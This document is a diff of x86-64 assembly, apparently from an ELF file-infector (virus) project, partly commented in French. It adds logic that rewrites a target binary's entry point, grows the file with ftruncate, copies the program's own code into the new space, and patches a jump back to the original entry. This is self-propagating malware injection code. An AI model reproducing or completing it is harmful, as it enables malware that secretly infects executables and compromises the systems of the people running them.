@@ -6,6 +6,7 @@
 %define SYS_FSTAT 5
 %define SYS_MMAP 9
 %define SYS_MUNMAP 11
+%define SYS_FTRUNCATE 77
 
 %define O_RDONLY 0o
 %define O_RDWR 0o2
@@ -241,6 +242,7 @@ treat_file:
 	%local payload_offset:qword			; long payload_offset;
 	%local next_available_vaddr:qword		; Elf64_addr next_available_vaddr;
 	%local payload_size:qword			; long payload_size;
+	%local offset_to_sub_mmap:qword			; long offset_to_sub_mmap;
 	%xdefine pathbuf rbp - %$localsize - PATH_MAX	; uint8_t pathbuf[PATH_MAX];
 	%assign %$localsize %$localsize + PATH_MAX	; ...
 	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
@@ -368,6 +370,20 @@ treat_file:
 	; TODO Check error
 	mov [next_available_vaddr], rax
 
+.my_label:
+	mov rdi, [filesize]
+	and rdi, 0xFFF
+	mov rsi, [next_available_vaddr]
+	and rsi, 0xFFFFFFFFFFFFF000
+	add rsi, rdi
+	mov rdi, [next_available_vaddr]
+	xor r8, r8
+	mov r9, 0x1000
+	cmp rdi, rsi
+	cmova r8, r9
+	add rsi, r8
+	mov [next_available_vaddr], rsi
+
 	mov rdi, _end - _start
 	mov [payload_size], rdi
 
@@ -384,13 +400,75 @@ treat_file:
 	mov r8, [payload_size]				; payload_size,
 	call convert_pt_note_to_load			; );
 
-	; TODO Etendre le fichier + copier le payload la bas + changer le jump
+	; TODO Clean
+	mov rdi, [mappedfile]
+	add rdi, elf64_hdr.e_entry
+	mov rax, [next_available_vaddr]
+	mov [rdi], rax
+
+	mov rax, SYS_FTRUNCATE				; _ret = ftruncate(
+	mov rdi, [fd]					; fd,
+	mov rsi, [filesize]				; filesize
+	add rsi, [payload_size]				; + payload_size
+	add rsi, 0x1000		; TEMP TODO REMOVE THIS SHIT
+	syscall						; );
+	cmp rax, 0					; if (_ret < 0)
+	jl .unmap_err					;	goto .unmap_err
+
+	xor rdx, rdx					; _offset = old_filesize / page_size
+	mov rax, [filesize]				; ...
+	mov rdi, 0x1000
+	div rdi						; ...
+	mul rdi						; _offset *= page_size;
+	mov [offset_to_sub_mmap], rax			; offset_to_sub_mmap = _offset;
+	mov rdi, [mappedfile]				; _addr = mapped_file
+	add rdi, rax					; _addr += _offset
+
+	mov rax, SYS_MMAP				; _ret = mmap(
+							;	_addr,
+	mov rsi, [filesize]				; 	filesize
+	sub rsi, [offset_to_sub_mmap]			;	  - offset_to_sub_mmap,
+	add rsi, [payload_size]				;	  + payload_size
+	add rsi, 0x1000	; TODO REMOVE THIS SHIT
+	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
+	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
+	mov r8, [fd]					; 	fd,
+	mov r9, [offset_to_sub_mmap]			;	offset_to_sub_mmap
+	syscall						; );
+
+	; TODO Check mmap
+
+	; copy all bytes between _start and _end to the segment
+	mov rdi, [mappedfile]				; dest = file_map + filesize;
+	add rdi, [filesize]				; ...
+	lea rsi, [rel _start]				; src = _start;
+	mov rcx, _end - _start				; len = _end - _start;
+	rep movsb					; memcpy(dest, src, len);
+
+	; compute jmp_value
+							; code_length_to_jmp = _jmp_instr - _start + 5 (5 is the size of the jmp instruction)
+	mov rdi, [mappedfile]				; _old_entry = file_map
+	add rdi, elf64_hdr.e_entry			; 	->e_entry;
+	mov rax, [rdi]					; ...
+
+	; J'ai ptêt fait n'importe dans l'autre inject, j'ai modifié pour que ce soit edi mais en fait c'est bien rdi
+	; _computed_jmp_value ; TODO Comments
+	sub rax, [filesize]				; ... TODO This is new_entry, precise better pls
+	sub rax, _jmp_instr - _start			; ...
+	sub rax, 5					; ...
+
+	; change jmp_value in injected code
+	mov rdi, [mappedfile]				; jmp_value_ptr = file_map + new_entry + (_end - _start) - 8 (8 is the size of the jmp_value variable);
+	add rdi, [filesize]				; ...
+	add rdi, _jmp_instr - _start			; ...
+	inc rdi						; ...
+	mov [rdi], eax					; *jmp_value_ptr = _computed_jmp_value;
 	
 	; TODO: check codecave can contain signature
 	; Sign file
-	mov rdi, [mappedfile]				; sign(mappedfile, exec_segment);
-	mov rsi, [exec_segment]				; ...
-	call sign					; ...
+;	mov rdi, [mappedfile]				; sign(mappedfile, exec_segment);
+;	mov rsi, [exec_segment]				; ...
+;	call sign					; ...
 
 	jmp .unmap_file
 
@@ -468,7 +546,7 @@ get_next_available_vaddr:
 	mov QWORD [furthest_segment_end], 0
 
 	; loop through program headers
-	mov si, 0					; i = 0;
+	mov rsi, 0					; i = 0;
 	.begin_phdr_loop:				; do {
 		mov rax, [file_map]			; _cur_phdr = file_map
 		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
@@ -489,7 +567,7 @@ get_next_available_vaddr:
 		cmova r9, r8				;	_furthest_segment_end = _cur_furthest;
 		mov [furthest_segment_end], r9		; ...
 
-		inc si					; i++;
+		inc rsi					; i++;
 		cmp si, [e_phnum]			; } while (i != e_phnum);
 		jne .begin_phdr_loop			; ...
 
@@ -853,8 +931,6 @@ convert_pt_note_to_load:
 	call find_note_segment				; _ret = find_note_seggment(file_map);
 	cmp rax, 0					; if (_ret == NULL)
 	je .err						; 	goto .end_err;
-
-	mov rax, [note_segment]				; _note_segment = note_segment;
 
 	mov rdi, rax					; _type_ptr = &_note_segment->p_flags;
 	add rdi, elf64_phdr.p_type			; ...
